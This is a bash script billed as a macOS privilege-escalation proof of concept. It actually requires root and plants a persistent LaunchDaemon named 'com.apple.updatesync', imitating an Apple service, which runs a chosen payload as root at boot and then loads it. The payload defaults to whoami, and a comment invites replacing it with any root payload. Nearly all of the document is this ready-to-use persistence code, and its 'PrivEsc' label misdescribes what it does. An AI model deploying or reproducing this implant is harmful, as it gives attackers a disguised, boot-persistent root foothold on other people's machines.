#!/bin/bash
# -----------------------------------------------------------------------------
# macOS LaunchDaemon PrivEsc PoC – Requires root
# Creates a LaunchDaemon that executes a root-level payload on system boot
# Permit execution: chmod +x poc.sh
# Execute via: sudo ./poc.sh

# Author: SentinelByte
# Version: 1.01
# -----------------------------------------------------------------------------

PLIST_NAME="com.apple.updatesync.plist"
PLIST_PATH="/Library/LaunchDaemons/$PLIST_NAME"
PAYLOAD="/usr/bin/whoami"  # Change this to any root-level payload you want

# -----------------------------------------------------------------------------
# Write the LaunchDaemon plist
# -----------------------------------------------------------------------------

echo "[*] Writing LaunchDaemon plist to: $PLIST_PATH (requires sudo/root)"
cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updatesync</string>

    <key>ProgramArguments</key>
    <array>
        <string>$PAYLOAD</string>
    </array>

    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# -----------------------------------------------------------------------------
# Set proper permissions and load
# -----------------------------------------------------------------------------

echo "[*] Fixing permissions and ownership (must be root)"
sudo chown root:wheel "$PLIST_PATH"
sudo chmod 644 "$PLIST_PATH"

echo "[+] LaunchDaemon written."
echo "[*] Loading LaunchDaemon (executes as root):"
sudo launchctl load "$PLIST_PATH"
